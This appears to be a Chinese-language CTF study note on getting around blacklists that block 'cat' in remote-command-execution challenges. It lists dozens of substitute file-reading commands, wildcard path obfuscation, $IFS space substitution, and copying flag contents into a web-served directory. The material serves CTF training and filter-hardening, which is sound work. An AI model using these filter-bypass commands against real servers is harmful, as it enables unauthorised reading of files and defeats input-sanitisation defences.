## 一句话概括

过滤 `cat` 是**最没有意义的一种防护**：Linux 上"能把文件内容打出来"的命令有几十个，随便换一个就能读 flag。真正需要绕过的是**对文件内容/路径的过滤**，而不是命令名本身。

## 原理

Unix 的设计哲学是"一切皆文件、一个程序只做一件事"。因此读文件从来不是 `cat` 的专利：

- **查看类**：`cat`、`tac`、`more`、`less`、`head`、`tail`、`nl`
- **编码/二进制类**：`od`、`xxd`、`hexdump`、`base64`
- **文本处理类**：`sort`、`uniq`、`rev`、`paste`、`grep`、`awk`、`sed`、`strings`
- **编辑类**：`vi`、`vim`（交互式，需 TTY）
- **复制类**：`cp`、`dd`、`tee`（先落盘再读）

它们都接受"文件名"作为参数并把内容输出/处理，因此在 RCE 场景下彼此等价。**只要黑名单没有把所有同类命令一起列全，就一定有漏网的。**

## 利用条件

1. 有命令执行点（`system` / `shell_exec` / 反引号 / 反弹 shell）
2. 目标文件**可读**（Web 用户对 flag 有读权限，或 flag 就在网站目录下）
3. 找得到 flag 的**路径**（`ls`、`find`、通配符）

## 命令速查

| 替代命令 | 说明 | 典型用法 |
|---|---|---|
| `tac` | `cat` 的反向，**从最后一行倒着显示** | `tac /flag` |
| `more` | 一页一页显示，`空格`翻页 | `more /flag` |
| `less` | 与 `more` 类似，支持 `PgUp`/`PgDn` 翻页 | `less /flag` |
| `head` | 显示**开头几行** | `head -n 100 /flag` |
| `tail` | 显示**结尾几行** | `tail -n 100 /flag` |
| `nl` | 显示内容并**带行号** | `nl /flag` |
| `od` | 以**八进制/二进制**方式读取，`-c` 可直接看字符 | `od -c /flag` |
| `vi` | 编辑器，也可用来查看 | `vi /flag` |
| `vim` | 同上，`-` 可从 stdin 读 | `vim /flag` |
| `sort` | 排序后输出，等价于打印全部行 | `sort /flag` |
| `uniq` | 去重后输出，单文件同样能打印 | `uniq /flag` |
| `file -f` | `-f` 表示"从文件里读文件名列表"；把 flag 当列表传入，**报错信息里会带出文件内容** | `file -f /flag` |

补充等价命令（原文未列，同样常用）：

| 命令 | 说明 |
|---|---|
| `rev` | 逐行反转字符 |
| `paste` | 默认按列拼接，单文件即原样输出 |
| `strings` | 抽取可打印字符串，读二进制/无回显时好用 |
| `grep ''` | 空模式匹配所有行 → 全量打印 |
| `awk 1` | 恒为真的表达式 → 打印所有行 |
| `sed -n '1,$p'` | 打印第 1 行到末行 |
| `dd if=/flag` | 块复制，直接输出到 stdout |
| `xxd` / `hexdump -C` | 十六进制转储 |
| `base64` | 编码输出，适合内容含特殊字符时外带 |
| `cp /flag /tmp/1.txt` | 先复制到可访问目录再读 |
| `echo $(</flag)` | 重定向读入，等价打印 |

## 完整示例

```bash
# 1. cat 被过滤，直接换 tac（最省事，flag 常在最后一行）
tac /fla*

# 2. 命令名也被通配符黑名单卡住时，用路径通配
/???/??c /flag        # /bin/tac
/???/??d -c /flag     # /bin/od
/[b]in/cat /flag

# 3. 空格被过滤，用 $IFS
cat$IFS/flag

# 4. flag 关键字被过滤，用通配符匹配文件名
tac /fla*
tac /????             # 若文件名恰为 4 字符

# 5. 内容含特殊字符、无法直接回显时，先编码再读
base64 /flag
cat /flag | base64
```

### 无回显时的组合拳

```bash
# 把结果写进 Web 可访问的目录
sort /flag > /var/www/html/1.txt
cat /flag | base64 | tee /var/www/html/1.txt
```

## 踩坑与备注

- **原笔记的核心结论**："`cat` 被绕过，同类型命令代替" —— 别把精力花在想办法拼回 `cat` 上，直接换命令更快。
- **`file -f` 是"报错读文件"**：`-f` 的本意是从文件读取"待检测文件名列表"，把 flag 当成列表传进去，`file` 会逐行报"无法打开 xxx"，报错里正好带着文件内容。
- **交互式命令要小心**：`vi`/`vim`/`more`/`less` 在**非 TTY**（如 `system()` 的管道）环境下可能直接报错或挂起，优先用 `tac`/`head`/`sort` 这些非交互命令。
- **`od` 是二进制读**：不加 `-c` 时是一堆八进制数字，别以为读错了文件。
- **换命令只是第一步**：如果服务器同时过滤了 `flag`、`/`、空格，就要叠加上通配符、`$IFS`、变量拼接等手段，详见《RCE漏洞全解》。
